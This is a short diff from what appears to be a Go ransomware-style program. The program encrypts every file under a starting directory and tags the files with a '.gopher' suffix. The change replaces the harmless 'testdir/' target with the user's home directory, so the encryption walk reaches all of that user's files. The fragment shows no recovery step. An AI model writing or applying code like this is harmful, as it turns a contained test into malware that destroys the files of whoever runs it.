@@ -167,7 +167,8 @@ func main() {
 	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))
 
 	const suffix = ".gopher"
-	const startingDirectory = "testdir/"
+	startingDirectory, _ := os.UserHomeDir()
+	startingDirectory = startingDirectory + "/"
 
 	// Go through every file in the starting directory and encrypt it
 	filepath.Walk(startingDirectory, func(path string, info os.FileInfo, err error) error {
